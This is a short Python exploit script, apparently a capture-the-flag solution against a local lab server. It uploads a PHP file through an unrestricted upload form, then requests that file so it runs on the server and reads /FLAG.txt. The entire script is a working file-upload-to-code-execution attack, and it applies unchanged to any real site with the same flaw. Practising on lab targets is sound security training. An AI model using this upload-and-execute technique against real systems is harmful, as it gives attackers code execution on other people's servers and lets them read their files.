import requests

base_url = "http://127.0.0.1:32891"

# Create a PHP file that reads FLAG.txt
php_code = """<?php
echo file_get_contents('/FLAG.txt');
?>"""

print("[+] Uploading flag reader PHP file...")

# Upload the new PHP file
files = {
    'uploaded_file': ('flag_reader.php', php_code, 'application/x-php')
}
data = {
    'title': 'FlagReader',
    'summary': 'Flag reader',
    'content': 'Flag reader script'
}

resp = requests.post(f"{base_url}/upload.php", files=files, data=data)
print(f"Upload status: {resp.status_code}")
print(f"Upload response (first 500 chars): {resp.text[:500]}")

if resp.status_code == 200:
    print("\n[+] Attempting to access uploaded flag_reader.php...")
    
    # Try to access the uploaded file
    access_resp = requests.get(f"{base_url}/posts/uploads/flag_reader.php")
    print(f"Access status: {access_resp.status_code}")
    print(f"Full response:")
    print(access_resp.text)
    
    # Check for flag
    import re
    flags = re.findall(r'FLAG\{[^}]+\}', access_resp.text)
    if flags:
        print(f"\n[!!!] FLAGS FOUND:")
        for flag in flags:
            print(f"  {flag}")

